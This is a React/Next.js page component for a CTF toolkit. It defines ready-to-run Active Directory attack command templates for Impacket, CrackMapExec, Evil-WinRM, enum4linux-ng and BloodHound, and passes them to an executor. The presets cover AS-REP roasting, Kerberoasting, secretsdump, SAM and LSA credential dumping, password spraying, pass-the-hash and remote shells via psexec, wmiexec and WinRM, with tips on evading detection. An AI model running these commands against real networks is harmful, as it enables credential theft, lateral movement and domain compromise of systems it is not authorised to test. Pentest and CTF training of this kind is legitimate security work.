"use client";

import { useState } from 'react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Button } from '@/components/ui/button';
import { ArrowLeft, Users } from "lucide-react";
import Link from 'next/link';
import { ToolExecutor } from '../lib/tool-executor';
import { Tool } from '../lib/types';

const impacket: Tool = {
  id: 'impacket',
  name: 'Impacket',
  description: 'Python AD/SMB toolkit',
  longDescription: 'Impacket is a collection of Python classes for working with network protocols. It is the de-facto standard for Active Directory attacks, including Kerberos attacks, SMB relay, secretsdump, and remote execution.',
  installCmd: 'apt-get install -y impacket-scripts || pip install impacket',
  checkCmd: 'which impacket-secretsdump || which secretsdump.py',
  documentation: 'https://github.com/fortra/impacket',
  presets: [
    {
      id: 'getNPUsers',
      name: 'AS-REP Roasting',
      level: 'intermediate',
      description: 'Get TGT for users without pre-auth',
      command: 'impacket-GetNPUsers {domain}/{user} -dc-ip {dc} -no-pass -usersfile {userlist}',
      args: [
        { name: 'domain', placeholder: 'domain.local', description: 'AD domain name', required: true, type: 'text' },
        { name: 'user', placeholder: '', description: 'Username (empty for null)', required: false, type: 'text' },
        { name: 'dc', placeholder: '10.10.10.10', description: 'Domain Controller IP', required: true, type: 'text' },
        { name: 'userlist', placeholder: '/tmp/users.txt', description: 'File with usernames', required: true, type: 'text' },
      ],
      notes: ['Finds users with "Do not require Kerberos preauthentication"', 'Crack with hashcat -m 18200', 'No credentials needed!'],
    },
    {
      id: 'GetUserSPNs',
      name: 'Kerberoasting',
      level: 'intermediate',
      description: 'Get TGS for service accounts',
      command: 'impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {dc} -request',
      args: [
        { name: 'domain', placeholder: 'domain.local', description: 'AD domain', required: true, type: 'text' },
        { name: 'user', placeholder: 'username', description: 'Domain user', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'User password', required: true, type: 'text' },
        { name: 'dc', placeholder: '10.10.10.10', description: 'DC IP', required: true, type: 'text' },
      ],
      notes: ['Requires valid domain credentials', 'Crack with hashcat -m 13100', 'Target service accounts with SPNs'],
    },
    {
      id: 'secretsdump',
      name: 'Dump Secrets',
      level: 'advanced',
      description: 'Extract hashes from DC or local SAM',
      command: 'impacket-secretsdump {domain}/{user}:{pass}@{target}',
      args: [
        { name: 'domain', placeholder: 'domain.local', description: 'Domain', required: true, type: 'text' },
        { name: 'user', placeholder: 'administrator', description: 'Admin user', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password or NTLM hash', required: true, type: 'text' },
        { name: 'target', placeholder: '10.10.10.10', description: 'Target (DC for domain)', required: true, type: 'text' },
      ],
      notes: ['Extracts NTLM hashes, Kerberos keys', 'On DC: gets entire domain hashes', 'Can use -hashes LMHASH:NTHASH'],
      dangerous: true,
    },
    {
      id: 'psexec',
      name: 'PSExec',
      level: 'advanced',
      description: 'Get shell via SMB (admin)',
      command: 'impacket-psexec {domain}/{user}:{pass}@{target}',
      args: [
        { name: 'domain', placeholder: 'domain.local', description: 'Domain', required: true, type: 'text' },
        { name: 'user', placeholder: 'administrator', description: 'Admin user', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password', required: true, type: 'text' },
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
      ],
      notes: ['Requires local admin rights', 'Creates service, very detectable', 'Use wmiexec for stealthier option'],
    },
    {
      id: 'wmiexec',
      name: 'WMIExec',
      level: 'advanced',
      description: 'Shell via WMI (stealthier)',
      command: 'impacket-wmiexec {domain}/{user}:{pass}@{target}',
      args: [
        { name: 'domain', placeholder: 'domain.local', description: 'Domain', required: true, type: 'text' },
        { name: 'user', placeholder: 'administrator', description: 'Admin user', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password', required: true, type: 'text' },
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
      ],
      notes: ['Uses WMI for execution', 'More stealthy than psexec', 'Semi-interactive shell'],
    },
    {
      id: 'pth',
      name: 'Pass The Hash',
      level: 'expert',
      description: 'Authenticate with NTLM hash',
      command: 'impacket-psexec -hashes :{hash} {domain}/{user}@{target}',
      args: [
        { name: 'domain', placeholder: 'domain.local', description: 'Domain', required: true, type: 'text' },
        { name: 'user', placeholder: 'administrator', description: 'User', required: true, type: 'text' },
        { name: 'hash', placeholder: 'aad3b435b51404eeaad3b435b51404ee', description: 'NTLM hash', required: true, type: 'text' },
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
      ],
      notes: ['No password needed, just hash', 'Format: LM:NTLM (use empty LM)', 'Works with most impacket tools'],
    },
  ],
};

const crackmapexec: Tool = {
  id: 'crackmapexec',
  name: 'CrackMapExec',
  description: 'Swiss army knife for AD pentesting',
  longDescription: 'CrackMapExec (CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. It can enumerate shares, spray passwords, execute commands, and much more.',
  installCmd: 'apt-get install -y crackmapexec || pipx install crackmapexec',
  checkCmd: 'which crackmapexec || which cme',
  documentation: 'https://github.com/byt3bl33d3r/CrackMapExec',
  presets: [
    {
      id: 'smb-enum',
      name: 'SMB Enumeration',
      level: 'basic',
      description: 'Basic SMB info gathering',
      command: 'crackmapexec smb {target}',
      args: [
        { name: 'target', placeholder: '10.10.10.0/24', description: 'Target IP/range', required: true, type: 'text' },
      ],
      notes: ['Shows hostname, domain, SMB version', 'No credentials needed', 'Good first step'],
    },
    {
      id: 'smb-auth',
      name: 'SMB Authentication',
      level: 'intermediate',
      description: 'Test credentials against SMB',
      command: 'crackmapexec smb {target} -u {user} -p {pass}',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
        { name: 'user', placeholder: 'administrator', description: 'Username', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password', required: true, type: 'text' },
      ],
      notes: ['(Pwn3d!) means local admin', 'Can use -H for hash instead of -p'],
    },
    {
      id: 'shares',
      name: 'Enumerate Shares',
      level: 'intermediate',
      description: 'List accessible SMB shares',
      command: 'crackmapexec smb {target} -u {user} -p {pass} --shares',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
        { name: 'user', placeholder: 'user', description: 'Username', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password', required: true, type: 'text' },
      ],
      notes: ['Shows READ/WRITE permissions', 'Look for unusual shares'],
    },
    {
      id: 'pass-spray',
      name: 'Password Spray',
      level: 'advanced',
      description: 'Test one password against many users',
      command: 'crackmapexec smb {target} -u {userlist} -p {pass} --continue-on-success',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'DC IP', required: true, type: 'text' },
        { name: 'userlist', placeholder: '/tmp/users.txt', description: 'User list', required: true, type: 'text' },
        { name: 'pass', placeholder: 'Password123!', description: 'Password to spray', required: true, type: 'text' },
      ],
      notes: ['Be careful of lockout policies!', '--continue-on-success finds all valid', 'Common passwords: Season+Year, Company+123'],
      dangerous: true,
    },
    {
      id: 'sam',
      name: 'Dump SAM',
      level: 'advanced',
      description: 'Dump local SAM database',
      command: 'crackmapexec smb {target} -u {user} -p {pass} --sam',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
        { name: 'user', placeholder: 'administrator', description: 'Local admin', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password', required: true, type: 'text' },
      ],
      notes: ['Requires local admin', 'Gets local user hashes'],
    },
    {
      id: 'lsa',
      name: 'Dump LSA Secrets',
      level: 'expert',
      description: 'Dump LSA secrets (cached creds)',
      command: 'crackmapexec smb {target} -u {user} -p {pass} --lsa',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
        { name: 'user', placeholder: 'administrator', description: 'Admin', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password', required: true, type: 'text' },
      ],
      notes: ['May contain cached domain creds', 'Service account passwords', 'Requires local admin'],
    },
  ],
};

const evilwinrm: Tool = {
  id: 'evilwinrm',
  name: 'Evil-WinRM',
  description: 'WinRM shell for pentesting',
  longDescription: 'Evil-WinRM is a shell for hacking/pentesting Windows Remote Management. It provides features like command history, file upload/download, and PowerShell integration.',
  installCmd: 'apt-get install -y evil-winrm || gem install evil-winrm',
  checkCmd: 'which evil-winrm',
  documentation: 'https://github.com/Hackplayers/evil-winrm',
  presets: [
    {
      id: 'basic',
      name: 'Basic Connection',
      level: 'basic',
      description: 'Connect with username/password',
      command: 'evil-winrm -i {target} -u {user} -p {pass}',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target IP', required: true, type: 'text' },
        { name: 'user', placeholder: 'administrator', description: 'Username', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password', required: true, type: 'text' },
      ],
      notes: ['WinRM runs on 5985 (HTTP) or 5986 (HTTPS)', 'User must be in Remote Management Users'],
    },
    {
      id: 'hash',
      name: 'Pass The Hash',
      level: 'intermediate',
      description: 'Connect with NTLM hash',
      command: 'evil-winrm -i {target} -u {user} -H {hash}',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
        { name: 'user', placeholder: 'administrator', description: 'User', required: true, type: 'text' },
        { name: 'hash', placeholder: 'aad3b435b51404eeaad3b435b51404ee', description: 'NTLM hash', required: true, type: 'text' },
      ],
    },
    {
      id: 'ssl',
      name: 'SSL Connection',
      level: 'intermediate',
      description: 'Connect over HTTPS (port 5986)',
      command: 'evil-winrm -i {target} -u {user} -p {pass} -S',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
        { name: 'user', placeholder: 'administrator', description: 'User', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password', required: true, type: 'text' },
      ],
      notes: ['-S enables SSL', 'Uses port 5986'],
    },
    {
      id: 'scripts',
      name: 'With PowerShell Scripts',
      level: 'advanced',
      description: 'Load PS scripts directory',
      command: 'evil-winrm -i {target} -u {user} -p {pass} -s {scripts}',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
        { name: 'user', placeholder: 'administrator', description: 'User', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password', required: true, type: 'text' },
        { name: 'scripts', placeholder: '/opt/ps-scripts/', description: 'Scripts directory', required: true, type: 'text' },
      ],
      notes: ['Scripts available via menu', 'Great for PowerView, Mimikatz PS'],
    },
  ],
};

const enum4linux: Tool = {
  id: 'enum4linux',
  name: 'enum4linux-ng',
  description: 'SMB/LDAP enumeration tool',
  longDescription: 'enum4linux-ng is a next generation version of enum4linux, a tool for enumerating information from Windows and Samba systems. It queries SMB, LDAP, and RPC to gather users, shares, policies, and more.',
  installCmd: 'apt-get install -y enum4linux-ng || pip install enum4linux-ng',
  checkCmd: 'which enum4linux-ng || which enum4linux',
  documentation: 'https://github.com/cddmp/enum4linux-ng',
  presets: [
    {
      id: 'all',
      name: 'Full Enumeration',
      level: 'basic',
      description: 'Run all enumeration modules',
      command: 'enum4linux-ng -A {target}',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target IP', required: true, type: 'text' },
      ],
      notes: ['-A runs all simple enumeration', 'No credentials, null session', 'Good starting point'],
    },
    {
      id: 'users',
      name: 'Enumerate Users',
      level: 'intermediate',
      description: 'List domain/local users',
      command: 'enum4linux-ng -U {target}',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
      ],
      notes: ['Via RID cycling if null session allowed'],
    },
    {
      id: 'shares',
      name: 'Enumerate Shares',
      level: 'basic',
      description: 'List SMB shares',
      command: 'enum4linux-ng -S {target}',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
      ],
    },
    {
      id: 'auth',
      name: 'With Credentials',
      level: 'intermediate',
      description: 'Full enum with credentials',
      command: 'enum4linux-ng -A -u {user} -p {pass} {target}',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
        { name: 'user', placeholder: 'username', description: 'Username', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password', required: true, type: 'text' },
      ],
      notes: ['Gets more info with valid creds', 'Can enumerate domain groups, policies'],
    },
    {
      id: 'rid-brute',
      name: 'RID Bruteforce',
      level: 'advanced',
      description: 'Bruteforce RIDs for users',
      command: 'enum4linux-ng -R {target} -r {range}',
      args: [
        { name: 'target', placeholder: '10.10.10.10', description: 'Target', required: true, type: 'text' },
        { name: 'range', placeholder: '500-10000', description: 'RID range', required: true, type: 'text', default: '500-10000' },
      ],
      notes: ['Finds users even with no null session', 'Default range covers common RIDs'],
    },
  ],
};

const bloodhound: Tool = {
  id: 'bloodhound',
  name: 'BloodHound',
  description: 'AD attack path visualization',
  longDescription: 'BloodHound uses graph theory to reveal hidden and often unintended relationships within an Active Directory environment. It is invaluable for finding attack paths to Domain Admin.',
  installCmd: 'apt-get install -y bloodhound bloodhound.py || pip install bloodhound',
  checkCmd: 'which bloodhound-python || which bloodhound.py',
  documentation: 'https://bloodhound.readthedocs.io/',
  presets: [
    {
      id: 'collect',
      name: 'Collect AD Data',
      level: 'intermediate',
      description: 'Gather AD info for BloodHound',
      command: 'bloodhound-python -u {user} -p {pass} -d {domain} -dc {dc} -c All',
      args: [
        { name: 'domain', placeholder: 'domain.local', description: 'Domain name', required: true, type: 'text' },
        { name: 'user', placeholder: 'username', description: 'Domain user', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password', required: true, type: 'text' },
        { name: 'dc', placeholder: 'dc01.domain.local', description: 'DC hostname', required: true, type: 'text' },
      ],
      notes: ['-c All collects everything', 'Creates .json files for import', 'Upload to BloodHound GUI'],
    },
    {
      id: 'collect-stealth',
      name: 'Stealth Collection',
      level: 'advanced',
      description: 'Collect with less noise',
      command: 'bloodhound-python -u {user} -p {pass} -d {domain} -dc {dc} -c DCOnly',
      args: [
        { name: 'domain', placeholder: 'domain.local', description: 'Domain', required: true, type: 'text' },
        { name: 'user', placeholder: 'username', description: 'User', required: true, type: 'text' },
        { name: 'pass', placeholder: 'password', description: 'Password', required: true, type: 'text' },
        { name: 'dc', placeholder: 'dc01.domain.local', description: 'DC', required: true, type: 'text' },
      ],
      notes: ['-c DCOnly only queries DC', 'Less network traffic, harder to detect'],
    },
    {
      id: 'queries',
      name: 'Useful Cypher Queries',
      level: 'expert',
      description: 'Key BloodHound queries to run',
      command: 'echo "In BloodHound GUI:\\n1. Find Shortest Path to Domain Admin\\n2. Find Principals with DCSync Rights\\n3. Shortest Path from Owned Principals\\n4. Find computers where Domain Users are Local Admin"',
      args: [],
      notes: ['Use BloodHound GUI for visualization', 'Mark compromised nodes as "Owned"', 'Right-click for attack paths'],
    },
  ],
};

export default function ActiveDirToolsPage() {
  const [selectedTool, setSelectedTool] = useState<string>('impacket');

  const tools: Record<string, Tool> = { impacket, crackmapexec, evilwinrm, enum4linux, bloodhound };

  return (
    <div className="flex flex-1 flex-col gap-4 p-4 pt-6">
      <div className="flex items-center gap-4">
        <Button variant="ghost" size="sm" asChild>
          <Link href="/app/ctf/tools">
            <ArrowLeft className="h-4 w-4 mr-1" /> Back
          </Link>
        </Button>
        <div className="flex items-center gap-2">
          <div className="p-2 rounded-lg bg-cyan-500/10 border border-cyan-500/30">
            <Users className="h-5 w-5 text-cyan-500" />
          </div>
          <div>
            <h2 className="text-xl font-semibold">Active Directory</h2>
            <p className="text-xs text-muted-foreground">Domain enumeration and exploitation</p>
          </div>
        </div>
      </div>

      <Tabs value={selectedTool} onValueChange={setSelectedTool} className="flex-1">
        <TabsList>
          <TabsTrigger value="impacket">Impacket</TabsTrigger>
          <TabsTrigger value="crackmapexec">CrackMapExec</TabsTrigger>
          <TabsTrigger value="evilwinrm">Evil-WinRM</TabsTrigger>
          <TabsTrigger value="enum4linux">enum4linux</TabsTrigger>
          <TabsTrigger value="bloodhound">BloodHound</TabsTrigger>
        </TabsList>
        
        {Object.entries(tools).map(([id, tool]) => (
          <TabsContent key={id} value={id} className="mt-4">
            <ToolExecutor tool={tool} />
          </TabsContent>
        ))}
      </Tabs>
    </div>
  );
}

